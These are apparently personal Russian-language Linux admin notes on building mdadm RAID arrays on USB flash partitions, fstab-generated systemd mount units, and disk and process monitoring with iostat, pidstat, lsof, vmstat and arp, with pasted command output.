"хитрый" юнит systemd НЕ ПРИ ЧЕМ, ровно как и запись в /etc/mdadm/mdadm.conf (экранировал # " ARRAY /dev/md123 level=raid0 num-devices=3 metadata=1.2 name=lnxmnt:11 ID=41145349:3996058d:1c7cfc80:e7333159
   devices=/dev/sdb1,/dev/sdb3,/dev/sdb4"). ВОзможно считывается с заголовков в sdb1 sdb3 sdb4 (составных томов-частей md)
15.05.2023 - Подтверждение вышесказанному (см Кетов 4.1.1.уПРАВЛЕНИЕ ТОМАМАМИ И МАССИВАМИ) - UUID md метадиска храниться на ВСЕХ томах, включенных в md при его сборке! 

lsblk // данные о raid , до запроса к GUI!
NAME      MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINTS
sda         8:0    0  22,3G  0 disk
├─sda1      8:1    0  20,5G  0 part  /
├─sda2      8:2    0   1,8G  0 part  /mnt/sda-2
├─sda3      8:3    0    48M  0 part  /boot/efi
└─sda4      8:4    0     2M  0 part
sdb         8:16   1   1,9G  0 disk
├─sdb1      8:17   1   322M  0 part
│ └─md123   9:123  0   960M  0 raid0
├─sdb2      8:18   1 997,8M  0 part
├─sdb3      8:19   1   322M  0 part
│ └─md123   9:123  0   960M  0 raid0
└─sdb4      8:20   1   322M  0 part
  └─md123   9:123  0   960M  0 raid0

   Я end}

//:Я при создания/объединения на usb флешке 2 разделов в RAID1 и после их остановки RAID mdadm -S /dev/md22, отдельно примонтировать отделенный раздел неудалось!
sudo mount /dev/sdb1 /mnt/md22/
   mount: /mnt/md22: неизвестный тип файловой системы 'linux_raid_member'.
sudo tune2fs /mnt/md22/ -l
 tune2fs: Это каталог при попытке открыть /mnt/md22/
  Couldn't find valid filesystem superblock.   Я //
------------------------------------------
cat /proc/mdstat 
Personalities : [linear] [multipath] [raid0] [raid1] [raid6] [raid5] [raid4] [raid10]
md22 : active raid1 sdb1[0] sdb2[1]
      1046528 blocks super 1.2 [2/2] [UU]
Ketov
sudo mdadm -C /dev/md22 -l raid1 -n 2 /dev/sdc1 /dev/sdc2 // собрать (-С) массив уровня (-l) из 2 (-n) утройств
mdadm: /dev/sdc1 appears to contain an ext2fs file system
       size=1048576K  mtime=Tue Apr 11 23:09:49 2023
mdadm: Note: this array has metadata at the start and
    may not be suitable as a boot device.  If you plan to
    store '/boot' on this device please ensure that
    your boot-loader understands md/v1.x metadata, or use
    --metadata=0.90
mdadm: /dev/sdc2 appears to contain an ext2fs file system
       size=1048576K  mtime=Tue Apr 11 23:00:42 2023
Continue creating array? y
mdadm: Defaulting to version 1.2 metadata
mdadm: array /dev/md22 started.

lsblk
NAME     MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINTS
sda        8:0    0  22,3G  0 disk
├─sda1     8:1    0  20,5G  0 part  /
├─sda2     8:2    0   1,8G  0 part  /mnt/sda-2
├─sda3     8:3    0    48M  0 part  /boot/efi
└─sda4     8:4    0     2M  0 part
sdb        8:16   1   1,9G  0 disk
├─sdb1     8:17   1 967,8M  0 part
└─sdb2     8:18   1 997,8M  0 part  /home/oem/flusbmnt
sdc        8:32   1   3,7G  0 disk
├─sdc1     8:33   1     1G  0 part
│ └─md22   9:22   0  1022M  0 raid1
├─sdc2     8:34   1     1G  0 part
│ └─md22   9:22   0  1022M  0 raid1
├─sdc3     8:35   1     1G  0 part
└─sdc4     8:36   1   757M  0 part
sr0       11:0    1  1024M  0 rom


  === Узнать объем размер метадиска /dev/md22 ВОЗМОЖНО ТОЛЬКО ПОСЛЕ его монтирования) ===
lsblk -f /dev/md22 // просмотр объема размера метадиска после его монтирования в точку ~/flusbmnt
NAME FSTYPE FSVER LABEL UUID                                 FSAVAIL FSUSE% MOUNTPOINTS
md22 ext4   1.0         83baa45b-e4fe-4f42-b26d-4057bae87be2  920,3M     0% /home/oem/flusbmnt

df -h  // просмотр объема размера метадиска после его монтирования  ~/flusbmnt
Файл.система   Размер Использовано  Дост Использовано% Cмонтировано в
/dev/md22        988M          68K  921M            1% /home/oem/flusbmnt

du -sh ~/flusbmnt //просмотр объема размера занятых блоков в ~/flusbmnt после монтирования к ней md22
64K     /home/oem/flusbmnt/
  Выполнение lsblk -f  ПОСЛЕ Размонтирования md22 от ~/flusbmnt
lsblk -f /dev/md22
NAME FSTYPE FSVER LABEL UUID                                 FSAVAIL FSUSE% MOUNTPOINTS
md22 ext4   1.0         83baa45b-e4fe-4f42-b26d-4057bae87be2

 sudo mdadm -E /dev/sdb1 // детализации !ЧАСТИ ТОМА (sdb1)!, входящего md  
/dev/sdb1:
          Magic : a92b4efc
        Version : 1.2
    Feature Map : 0x0
     Array UUID : 2fb48274:6f76437b:366047d4:f53d4446
           Name : LnxPC:22  (local to host LnxPC)
  Creation Time : Tue Apr 11 23:24:28 2023
     Raid Level : raid1
   Raid Devices : 2
 Avail Dev Size : 2093056 sectors (1022.00 MiB 1071.64 MB)
     Array Size : 1046528 KiB (1022.00 MiB 1071.64 MB)
    Data Offset : 4096 sectors
   Super Offset : 8 sectors
   Unused Space : before=4016 sectors, after=0 sectors
          State : clean
    Device UUID : b39e7aa3:7fe2737e:f5f02e8a:8bf11461
    Update Time : Wed Apr 12 22:48:38 2023
  Bad Block Log : 512 entries available at offset 16 sectors
       Checksum : c0fe1ce - correct
         Events : 20
   Device Role : Active device 0
   Array State : AA ('A' == active, '.' == missing, 'R' == replacing)

 sudo mdadm -D /dev/md22  //  детализации всего md
/dev/md22:
           Version : 1.2
     Creation Time : Tue Apr 11 23:24:28 2023
        Raid Level : raid1
        Array Size : 1046528 (1022.00 MiB 1071.64 MB)
     Used Dev Size : 1046528 (1022.00 MiB 1071.64 MB)
      Raid Devices : 2
     Total Devices : 2
       Persistence : Superblock is persistent
       Update Time : Wed Apr 12 22:48:38 2023
             State : clean
    Active Devices : 2
   Working Devices : 2
    Failed Devices : 0
     Spare Devices : 0
Consistency Policy : resync
              Name : LnxPC:22  (local to host LnxPC)
              UUID : 2fb48274:6f76437b:366047d4:f53d4446
            Events : 20
    Number   Major   Minor   RaidDevice State
       0       8       17        0      active sync   /dev/sdb1
       1       8       18        1      active sync   /dev/sdb2

sudo mdadm -D /dev/md127 
/dev/md127:
           Version : 1.2
     Creation Time : Fri Apr 14 18:24:57 2023
        Raid Level : raid0
        Array Size : 983040 (960.00 MiB 1006.63 MB)
      Raid Devices : 3
     Total Devices : 3
       Persistence : Superblock is persistent
       Update Time : Fri Apr 14 18:24:57 2023
             State : clean
    Active Devices : 3
   Working Devices : 3
    Failed Devices : 0
     Spare Devices : 0
            Layout : -unknown-   //!! ??алогоритм записи котрольной суммы/четности для RAID5(4,6) 
        Chunk Size : 512K
Consistency Policy : none
              Name : lnxmnt:11
              UUID : 41145349:3996058d:1c7cfc80:e7333159
            Events : 0
    Number   Major   Minor   RaidDevice State
       0       8       17        0      active sync   /dev/sdb1
       1       8       19        1      active sync   /dev/sdb3
       2       8       20        2      active sync   /dev/sdb4

sudo mdadm -D -sv // (-D, --detail) Печать детализации о всех метадисках  в системе подробно (-v) c UUID
ARRAY /dev/md/22 level=raid1 num-devices=2 metadata=1.2 name=LnxPC:22 UUID=2fb48274:6f76437b:366047d4:f53d4446
   devices=/dev/sdb1,/dev/sdb2
ARRAY /dev/md123 level=raid0 num-devices=3 metadata=1.2 name=lnxmnt:11 UUID=41145349:3996058d:1c7cfc80:e7333159
   devices=/dev/sdc1,/dev/sdc3,/dev/sdc4


sudo mdadm -E -sv //(-E, --examine) Печать контента метаданных сохраненных на всех метадисках 
ARRAY /dev/md/22  level=raid1 metadata=1.2 num-devices=2 UUID=2fb48274:6f76437b:366047d4:f53d4446 name=LnxPC:22
   devices=/dev/sdb2,/dev/sdb1
ARRAY /dev/md/11  level=raid0 metadata=1.2 num-devices=3 UUID=41145349:3996058d:1c7cfc80:e7333159 name=lnxmnt:11
   devices=/dev/sdc4,/dev/sdc3,/dev/sdc1

sudo mdadm -D -sv >> /etc/mdadm/mdadm.conf // сохранить в конфиг файл данные о метадиске
"ARRAY /dev/md123 level=raid0 num-devices=3 metadata=1.2 name=lnxmnt:11     UUID=41145349:3996058d:1c7cfc80:e7333159   devices=/dev/sdb1,/dev/sdb3,/dev/sdb4"

sudo mdadm -S /dev/md123 // Остановить/разобрать, но не разрушать метадиск. 
   mdadm: stopped /dev/md123 // Я перед этим также м.б. потредуется отмонтировать disk:sudo umount /dev/md123

sudo mdadm -A /dev/md123 /dev/sdb1 /dev/sdb3 /dev/sdb4 // заново собрать метадиск с именем md123
sudo mdadm -A /dev/md123//заново собрать метадиск, ЕСЛИ РАНЕЕ в /etc/mdadm/mdadm.conf сохранена его конфигурация!!!
   mdadm: /dev/md123 has been started with 3 drives.

после "sudo mdadm -A /dev/md123/" md !не становиться примонтированным!, требуется его примонтировать через
   sudo mount /dev/md123 /mnt/md11

 -=== Проверка производительности записи и чтения на метадиски RAID (поблоковой записи и чтения) ===-
Я: на двух разделах usb-диска Trcdent 4G по 1G объед !RAID1!
sudo dd if=/dev/zero of=/mnt/md22/filetest bs=100M count=5// тест скорости записи на md RAID1 
5+0 записей получено
5+0 записей отправлено
524288000 байт (524 MB, 500 MiB) скопирован, 135,638 s, 3,9 MB/s
dd if=/mnt/md22/filetest of=/dev/null // тест скорости чтения c md RAID1
1024000+0 записей получено
1024000+0 записей отправлено
524288000 байт (524 MB, 500 MiB) скопирован, 72,7768 s, 7,2 MB/s

Я: на трех разделах usb-диска (черная 2G флешка) по 322M каждый  объединил !RAID0!
sudo dd if=/dev/zero of=/mnt/md22/filetest bs=100M count=5
5+0 записей получено
5+0 записей отправлено
524288000 байт (524 MB, 500 MiB) скопирован, 320,616 s, 1,6 MB/s
dd if=/mnt/md22/filetest of=/dev/null
1024000+0 записей получено
1024000+0 записей отправлено
524288000 байт (524 MB, 500 MiB) скопирован, 64,2037 s, 8,2 MB/s

--------------------fstab vs systemd (unit юнит модуль) точки монтирования --------------------------
данные из файла fstab автоматически преобразуются ядром ОС  в точку монтирования systemd.
К примеру то, что Я 10.04.2023  добавил вручную как мотнируемый при загрузке 
носитель /dev/disk/by-uuid/6c0e7c53-f07c-4258-803c-080aa36aee95, 
cat /etc/fstab
"# /etc/fstab: static file system information.
# <file system>                     <mount point>   <type>  <options>       <dump>  <pass>
UUID=1b33bbef-3cbf-41ea-9e3a-ed3b4ea26ba4 /           ext4  errors=remount-ro 0       1
UUID=9DCA-6AA1                            /boot/efi   vfat    umask=0077      0       1
UUID=6c0e7c53-f07c-4258-803c-080aa36aee95 /mnt/sda-2 ext4 defaults 0 1  " 
UUID=020ebf59-17ff-48ef-a985-fbbf6d437e61  /mnt/md22 ext2 defaults 0 1
end fstab

преобразовалость ОС Linux в следующее, автоматически!  загружаемое через systemd
a) /run/systemd/generator/mnt-sda\\x2d2.mount // Наряду с юнитом корневой файловой системы и дисков sdaХ (читай далее - b)
# Automatically generated by systemd-fstab-generator
[Unit]
Documentation=man:fstab(5) man:systemd-fstab-generator(8)
SourcePath=/etc/fstab
Before=local-fs.target
Requires=systemd-fsck@dev-disk-by\x2duuid-6c0e7c53\x2df07c\x2d4258\x2d803c\x2d080aa36aee95.service
After=systemd-fsck@dev-disk-by\x2duuid-6c0e7c53\x2df07c\x2d4258\x2d803c\x2d080aa36aee95.service
After=blockdev@dev-disk-by\x2duuid-6c0e7c53\x2df07c\x2d4258\x2d803c\x2d080aa36aee95.target
[Mount]
Where=/mnt/sda-2
What=/dev/disk/by-uuid/6c0e7c53-f07c-4258-803c-080aa36aee95
Type=ext4(END)
б) Для метадиска RAID /dev/md22 ОС создала точку монтирования /run/systemd/generator/mnt-md22.mount
[Unit]
Documentation=man:fstab(5) man:systemd-fstab-generator(8)
SourcePath=/etc/fstab   //!!!!!!!!!!!
Before=local-fs.target
Requires=systemd-fsck@dev-disk-by\x2duuid-020ebf59\x2d17ff\x2d48ef\x2da985\x2dfbbf6d437e61.service
After=systemd-fsck@dev-disk-by\x2duuid-020ebf59\x2d17ff\x2d48ef\x2da985\x2dfbbf6d437e61.service
After=blockdev@dev-disk-by\x2duuid-020ebf59\x2d17ff\x2d48ef\x2da985\x2dfbbf6d437e61.target
[Mount]
Where=/mnt/md22
What=/dev/disk/by-uuid/020ebf59-17ff-48ef-a985-fbbf6d437e61
Type=ext2
/run/systemd/generator/mnt-md22.mount

sudo systemctl status mnt-md22.mount // просмотр данных о точке монтир метадиска raid.созданной
   // автоматически в systemd из fstab"UUID=83b4...87be2 /mnt/md22 ext4 errors=remount-ro 0 0"
● mnt-md22.mount - /mnt/md22
     Loaded: loaded (/proc/self/mountinfo)
     Active: active (mounted) since Mon 2023-04-17 10:29:13 +03; 16min ago
      Where: /mnt/md22
       What: /dev/md22

sudo systemctl status *.mount // просмотр статуса всех точек монтирования

 =    =    = Программы РАСШИРЕННОЙ диагностики Linux (Ермакович серверы СКСУ IQM)    =    =    =   
https://www.linux.org/threads/disk-io.28259/
https://discuss.aerospike.com/t/how-to-interpret-iostat-output-related-to-aerospike/7113
https://haydenjames.io/linux-server-performance-disk-io-slowing-application/
dstat iotop atop
sysstat (iostat)  https://www.geeksforgeeks.org/iostat-command-in-linux-with-examples/

 = = = = = iostat - Отслеживание ресурсов CPU и устройств ввода ваывода = = = = =
iostat: Get report and statistic.
iostat -x: Show more details statistics information.
iostat -c: Show only the cpu statistic.
iostat -d: Display only the device report.
iostat -xd: Show extended I/O statistic for device only.
iostat -k: Capture the statistics in kilobytes or megabytes.
iostat -k 2 3: Display cpu and device statistics with delay.
iostat -j ID mmcbkl0 sda6 -x -m 2 2: Display persistent device name statistics.
iostat -p: Display statistics for block devices.
iostat -N: Display lvm2 statistic information.

iostat -ph ALL 3 // статистика каждые 3 сек по всем блочным устройствам в "человческом" предств 
avg-cpu:  %user   %nice %system %iowait  %steal   %idle
          15,5%    0,0%    6,6%    0,3%    0,0%   77,6%
      tps    kB_read/s    kB_wrtn/s    kB_dscd/s    kB_read    kB_wrtn    kB_dscd Device
     0,00         0,0k         0,0k         0,0k       0,0k       0,0k       0,0k sr0
    14,33         0,0k       206,7k         0,0k       0,0k     620,0k       0,0k sda
    14,33         0,0k       206,7k         0,0k       0,0k     620,0k       0,0k sda1
     0,00         0,0k         0,0k         0,0k       0,0k       0,0k       0,0k sda2
     0,00         0,0k         0,0k         0,0k       0,0k       0,0k       0,0k sda3
     0,00         0,0k         0,0k         0,0k       0,0k       0,0k       0,0k sda4

iostat -dh 2
      r/s     rkB/s   rrqm/s  %rrqm r_await rareq-sz Device
    0,02      0,3k     0,00   0,0%   17,45    22,0k md123
    6,69    202,4k     2,16  24,4%    0,41    30,3k sda
    0,05      1,1k     0,00   0,0%   11,71    20,7k sdb
    0,00      0,0k     0,00   0,0%    0,09     0,1k sr0

     w/s     wkB/s   wrqm/s  %wrqm w_await wareq-sz Device
    0,00      0,0k     0,00   0,0%    0,00     0,0k md123
    1,31     52,7k     1,92  59,5%    0,99    40,2k sda
    0,00      0,0k     0,00   0,0%    0,00     0,0k sdb
    0,00      0,0k     0,00   0,0%    0,00     0,0k sr0

     d/s     dkB/s   drqm/s  %drqm d_await dareq-sz Device
    0,00      0,0k     0,00   0,0%    0,00     0,0k md123
    0,00      0,0k     0,00   0,0%    0,00     0,0k sda
    0,00      0,0k     0,00   0,0%    0,00     0,0k sdb
    0,00      0,0k     0,00   0,0%    0,00     0,0k sr0

     f/s f_await  aqu-sz  %util Device
    0,00    0,00    0,00   0,0% md123
    0,24    2,71    0,00   0,5% sda
    0,00    0,00    0,00   0,0% sdb
    0,00    0,00    0,00   0,0% sr0



[aeon@IQMM1 plug]$ iostat -d -t -x //  статистика по серверу СКСУ (до внедрения СХД) sda - hdd c ОС (raid1 на уровне BIOS?),
sdb - БД (raid1 на уровне BIOS?), dm - синтетич диски LVM на основе sdb? 
Linux 2.6.32-696.1.1.el6.x86_64 (IQMM1)         06/06/2023      x86_64        (48 CPU)
06/06/2023 12:22:04 PM
Device:         rrqm/s   wrqm/s     r/s     w/s   rsec/s   wsec/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util
sda               5.82    55.72   11.43   19.85   576.35   610.91    37.95     0.07    2.23    2.15    2.28   1.24   3.88
sdb               0.00   103.19 2174.30 1004.67 175720.00  8863.10    58.06     0.04    0.01    0.03    0.06   0.02   4.85
dm-0              0.00     0.00    1.00    8.41    46.42    67.30    12.08     0.04    4.59    3.85    4.67   0.81   0.76
dm-1              0.00     0.00    0.29    0.20     2.29     1.64     8.00     0.00    3.16    2.05    4.71   0.39   0.02
dm-2              0.00     0.00   15.61   66.96   463.44   541.97    12.18     0.02    0.19    2.28    0.90   0.39   3.20

pidstat 2  // просмотр каждые 2 сек статистики о выполняемых процессах Linux и их ресурсах
  // после ^c - среднее значение
16:33:16      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
16:33:18    29999      4965    0,00    0,50    0,00    0,00    0,50     1  pidstat

16:33:18      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
16:33:20        0      4928    0,50    0,00    0,00    0,00    0,50     0  kworker/0:2-ata_sff
 q
 16:33:20      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
 16:33:22    29999      4965    0,00    0,50    0,00    0,00    0,50     1  pidstat
^C
Среднее:   UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
Среднее:     0       909    0,00    0,04    0,00    0,00    0,04     -  Xorg
Среднее: 29999      1058    0,04    0,00    0,00    0,00    0,04     -  dbus-daemon
Среднее: 29999      1204    0,04    0,00    0,00    0,00    0,04     -  xfce4-panel
Среднее: 29999      4965    0,04    0,19    0,00    0,00    0,23     -  pidstat

pidstat -p 909 1 // просмотр каждые 1 сек статистики о процессе 
Linux 5.15.0-56-generic (LnxPC)         07.05.2023      _x86_64_        (2 CPU)
16:36:46      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
16:36:57        0       909    3,00    2,00    0,00    0,00    5,00     0  Xorg
16:36:58        0       909    5,00    1,00    0,00    1,00    6,00     0  Xorg
16:36:59        0       909    0,99    0,99    0,00    0,00    1,98     1  Xorg

sudo iotop // iotop  watches  I/O usage information output by the Linux kernel

=====  Отслеживание ресурсов  // Внутреннее устройство Linux ( PDFDrive ).pdf ====
/usr/bin/time -v ls > /dev/null  // также time есть как встроенная команда в bash! но дает меньше статистики 
        Command being timed: "top"
        User time (seconds): 0.01
        System time (seconds): 0.00
        Percent of CPU this job got: 0%
        Elapsed (wall clock) time (h:mm:ss or m:ss): 0:07.15
        Average shared text size (kbytes): 0
        Average unshared data size (kbytes): 0
        Average stack size (kbytes): 0
        Average total size (kbytes): 0
        Maximum resident set size (kbytes): 4524
        Average resident set size (kbytes): 0
        Major (requiring I/O) page faults: 0
        Minor (reclaiming a frame) page faults: 322
        Voluntary context switches: 5
        Involuntary context switches: 1
        Swaps: 0
        File system inputs: 0
        File system outputs: 0
        Socket messages sent: 0
        Socket messages received: 0
        Signals delivered: 0
        Page size (bytes): 4096
        Exit status: 0

/usr/bin/time  find /
....
Command exited with non-zero status 1
0.71user 1.65system 0:09.90elapsed 23%CPU (0avgtext+0avgdata 5544maxresident)k
264inputs+0outputs (1major+8351minor)pagefaults 0swaps
 // major minor - количество больших (изза отсутсвия страниц при обращении к памяти swap подкачки) и малых ошибок ( изза отсутсвия страниц  при обращении к ОЗУ памяти) во время выполнения find /
// 23%CPU  во время выполнения find /

sudo renice -5 864 // изменить приоритет процесса Xorg, (864 process ID) старый приоритет 0, новый приоритет -5
было ДО:
    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
    864 root      20  0  330108 102432  44820 S   6,2   5,1   0:09.10 Xorg
стало ПОСЛЕ:
    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
    864 root      15  -5  330108 102432  44820 S   6,2   5,1   0:09.10 Xorg

lsof // вывод списка открытых файлов ВСЕХ процессов
COMMAND    PID  TID TASKCMD     USER   FD    TYPE   DEVICE SIZE/OFF       NODE NAME
systemd      1                  root  cwd    DIR     8,1     4096          2 /
systemd      1                  root  rtd    DIR     8,1     4096          2 /
systemd      1                  root  txt    REG     8,1  1849992     296158 /usr/lib/systemd/systemd
.....

sudo lsof +D /etc  //показать открытые процессами файлы во всех дочерних каталогах /etc 
COMMAND    PID  USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME
avahi-dae  633 avahi  cwd    DIR    8,1     4096 131090 /etc/avahi
avahi-dae  633 avahi  rtd    DIR    8,1     4096 131090 /etc/avahi
sudo      3692  root    5r   REG    8,1     1755 135050 /etc/sudoers
sudo      3695  root    5r   REG    8,1     1755 135050 /etc/sudoers

man lsof  // Описание ТИПОВ И номеров файловых дескрипторов
DESCRIPTION        Lsof revision 4.93.2 lists on its standard output file information about files opened by        processes for the following UNIX dialects !!!!: 
            Apple Darwin 9 and Mac OS X 10.[567]
            FreeBSD 8.[234], 9.0 and 1[012].0 for AMD64-based systems
            Linux 2.1.72 and above for x86-based systems
            Solaris 9, 10 and 11
Результат состоит из следующих полей (перечисленных в верхней строке).
 COMMAND. Командное имя для процесса, который удерживает дескриптор файла.
 PID. Идентификатор процесса.
 TID Идентификатор потока (нити) в процессе
 USER. Пользователь, запустивший процесс.
 FD. Это поле может содержать два типа элементов. В приведенном выше результате столбец FD показывает назначение файла. Это поле может также содержать файловый дескриптор открытого файла — число, которое процесс использует вместе с системными библиотеками и ядром, чтобы идентифицировать
файл и работать с ним.
FD         is the File Descriptor number of the file or:
                       cwd  current working directory;
                       Lnn  library references (AIX);
                       err  FD information error (see NAME column);
                       jld  jail directory (FreeBSD);
                       ltx  shared library text (code and data);
                       Mxx  hex memory-mapped type number xx.
                       m86  DOS Merge mapped file;
                       mem  memory-mapped file;
                       mmap memory-mapped device;
                       pd   parent directory;
                       rtd  root directory;
                       tr   kernel trace file (OpenBSD);
                       txt  program text (code and data);
                       v86  VP/ix mapped file;
                  FD  is  followed  by  one of these characters, describing the mode under
                  which the file is open:
                       r for read access;
                       w for write access;
                       u for read and write access;
                       space if mode unknown and no lock
                            character follows;
                       `-' if mode unknown and lock
                            character follows.
		остальное - см  man
 TYPE. Тип файла (обычный файл, каталог, сокет и т. п.).
 DEVICE. Старший и младший номера устройства, которое удерживает данный
файл. man DEVICE   contains the device numbers, separated by commas, for a character special, block special, regular, directory or NFS file;
 
 SIZE. Размер файла.
 NODE. Номер дескриптора inode для данного файла.
 NAME. Имя файла.

lsof /home/oem/  // список процессов, которые открыли файлы в /home/oem/
ps  xm  -o pid,tid,command // m - просмотр нитей/потоков (и их ID - TID), относящихся к процессам PID
    PID     TID COMMAND
   1012       - /lib/systemd/systemd --user
      -    1012 -
      -    1081 -
   1022       - xfce4-session  //  GUI mint
      -    1022 -
      -    1120 -
      -    1121 -
   1525       - bash  // терминал в GUI mint
      -    1525 -
   2293       - sshd: oem@pts/1  
      -    2293 -
   2294       - -bash // терминал через ssh
      -    2294 -
   2367       - /usr/lib/firefox/firefox // браузер  процесс с множеством потоков
      -    2367 -
      -    2371 -
      -    2372 -
      -    2378 -
      -    2379 -
      -    2380 -

   2716       - /usr/lib/firefox/firefox-bin -contentproc -childID 9 -isForBrowser -prefsLen
      -    2716 -
      -    2720 -
      -    2721 -
      -    2722 -
 ghbdtn 


$ cat > /tmp/LOG &
cat > /tmp/LOG &
[1] 18083
$ lsof -p 18083  // список файлов и их файловых дескрипторов, открытых  процессом -p PID 
                 // !через ssh не всегда корректно работает! 
COMMAND   PID USER   FD   TYPE DEVICE  SIZE/OFF     NODE NAME
cat     18083 oem  cwd    DIR   0,44      1580 43460784 /tmp/lsof
cat     18083 oem  rtd    DIR  253,2      4096        2 /
cat     18083 oem  txt    REG  253,2     47432   678364 /usr/bin/cat
cat     18083 oem  mem    REG  253,2 111950656   681778 /usr/lib/locale/locale-archive
cat     18083 oem  mem    REG  253,2   2119256   679775 /usr/lib64/libc-2.27.so
cat     18083 oem  mem    REG  253,2    187632   655943 /usr/lib64/ld-2.27.so
cat     18083 oem  mem    REG  253,2     26370   662532 /usr/lib64/gconv/gconv-modules.cache
cat     18083 oem  mem    REG  253,2      3316  1578981 /usr/lib/locale/en_US.utf8/LC_TIME
cat     18083 oem   0u   CHR  136,3       0t0        6 /dev/pts/3
cat     18083 oem   1w   REG   0,44         0 54550934 /tmp/LOG
cat     18083 oem   2u   CHR  136,3       0t0        6 /dev/pts/3

uptime  // 3 последние значаения - среднее значение загрузки за послед 1, 5,15 мин
   //  man uptime: "load average of 1 means a single CPU system is loaded all the time, while on a 4 CPU system it means it was idle 75% of the time" Если CPU 1 то "1"=100% загрузке CPU, если 4 CPU в ЗС "1"=75% загрузке всех CPU
 15:33:07 up  2:05,  2 users,  load average: 0,16, 0,03, 0,01

vmstat  2 // отслеживание ресурсов памяти ОЗУ подкачки swap с иетервалос 2 сек
procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
 1  0      0 151224  17028 331056    0    0     2    30 2996 7558  7  3 89  1  0
 0  0      0 149152  17028 331068    0    0     0     0 3239 8145 10  6 84  0  0
 0  0      0 149152  17028 331068    0    0     0     0 2920 7432 10  4 86  0  0
 1  0      0 149152  17052 331048    0    0     2    60 3123 7804 10  4 86  0  0
 6  0      0  77288  19984 402284    0    0 56690   742 4809 11780 23 14 56  7  0
 1  0      0  75956  14184 355232    0    0 26450  6712 4424 15059 50 22 20  8  0
 3  1      0  74752   1748 261852    0    0 39568  1848 4774 13693 50 26 18  6  0
подробнее значение полей см в man vmstat
Этот вывод распределяется по таким категориям: procs — для процессов,
memory — для использования памяти, swap — для страниц, которые перемещаются
в область подкачки и из нее, io — для использования диска, system — для количества переключений ядра на его код и cpu — для количества времени, затраченного различными частями системы.
Следует начинать просмотр со второй строки — в первой содержатся средние значения за все время работы системы. Нулевые значения в столбцах si (swap-in, «входящая» подкачка) и so (swap-out, «выходящая» подкачка)
ядро не занято никаким из видов подкачки с диска. Столбец buff сообщает объем
памяти, который ядро использует для дисковых буферов В правом столбце с заголовком CPU можно увидеть распределение процессорного времени (столбцы us, sy, id и wa). Они сообщают соответственно процентное
соотношение времени, которое процессор тратит на задачи пользователя, системные задачи (задачи ядра), бездействие и ожидание ввода/вывода. столбец b сообщает о том, что некоторые процессы блокированы (им не разрешен запуск) в ожидании страниц памяти. В целом количество свободной памяти уменьшается, но до ее нехватки еще очень далеко. Наблюдается также значительное количество дисковой активности, что от­
мечено увеличением значений в столбцах bi (blocks in, блоки «на входе») и bo (blocks out, блоки «на выходе»).

vmstat  -d // отслеживание ресурсов обращений к дискам
      всего merged секторы      ms всего merged секторы      ms    cur    sec
sr0       11      0       3       1      0      0       0       0      0      0
sda    67684  21686 3864748   27128  12358  18639 1062610   11240      0     44
sdb      550      0   22782    6442      0      0       0       0      0      4




/etc/mdadm/mdadm.conf
ARRAY /dev/md123 level=raid0 num-devices=3 metadata=1.2 name=lnxmnt:11 UUID=41145349:3996058d:1c7cfc80:e7333159
   devices=/dev/sdb1,/dev/sdb3,/dev/sdb4
ARRAY /dev/md/22 level=raid1 num-devices=2 metadata=1.2 name=LnxPC:22 UUID=2fb48274:6f76437b:366047d4:f53d4446
   devices=/dev/sdb1,/dev/sdb2
 
  = = = ARP = = = =

arp  //   Отображает текущие ARP-записи (кэш акз  в ядре)
Адрес HW-тип HW-адрес Флаги Маска Интерфейс
UES-Maniuk.main.beltele  ether   40:8d:5c:7c:e1:37   C                     enp0s3
XEROX_3330_306.main.bel  ether   9c:93:4e:74:38:cb   C                     enp0s3
XC-6A63B7.main.beltelec  ether   9c:93:4e:6a:63:b7   C                     enp0s3
 
arp -nv // табл arp в цифровом формате
10.250.14.12             ether   9c:93:4e:6a:69:97   C                     enp0s3
10.250.14.209            ether   00:21:b7:55:ef:f9   C                     enp0s3
10.250.14.51             ether   00:21:b7:55:13:9c   C                     enp0s3
10.250.14.36             ether   9c:93:4e:6a:61:97   C                     enp0s3
10.250.14.131            ether   78:8c:77:6c:c6:84   C                     enp0s3
10.250.15.157            ether   9c:93:4e:6a:6c:52   C                     enp0s3
10.250.15.26             ether   a4:5d:36:63:76:7d   C                     enp0s3
10.250.14.83             ether   00:21:b7:2d:24:15   C                     enp0s3
Записей: 53     Пропущено: 0    Найдено: 53

arp -a // arp подробно!
Tech_336.main.beltelecom.by (10.250.14.212) в 38:63:bb:d8:1c:03 [ether] на enp0s3
Lexmark415.main.beltelecom.by (10.250.14.29) в 00:21:b7:55:ef:bb [ether] на enp0s3
_gateway (10.250.0.1) в 02:04:96:52:ee:89 [ether] на enp0s3
Kyocera3045-103.main.beltelecom.by (10.250.15.84) в 00:17:c8:6e:bd:1b [ether] на enp0s3
HP428-331.main.beltelecom.by (10.250.14.65) в c8:5a:cf:60:0b:5c [ether] на enp0s3
HPM479-109.main.beltelecom.by (10.250.15.54) в c0:18:03:57:88:ca [ether] на enp0s3
XEROXWC-403.main.beltelecom.by (10.250.15.67) в 9c:93:4e:56:6f:cc [ether] на enp0s3
XEROX_327.main.beltelecom.by (10.250.14.173) в 9c:93:4e:56:6f:ca [ether] на enp0s3

arp -a | grep pc_ivanov* // узнать по host name ip и eth адреса
pc_ivanov.main.onliner.by (10.250.0.100) в b0:6e:bf:31:c8:15 [ether] на enp0s3

   = =  = = sudo lsof -i  - сканирование портов =  = =
sudo lsof -i // обзательно sudo! - отражает перечень процессов, прослушивающих порты, сканер портов
COMMAND    PID            USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
systemd-r  619 systemd-resolve   13u  IPv4  18419      0t0  UDP localhost:domain
systemd-r  619 systemd-resolve   14u  IPv4  18420      0t0  TCP localhost:domain (LISTEN)
avahi-dae  632           avahi   12u  IPv4  20362      0t0  UDP *:mdns
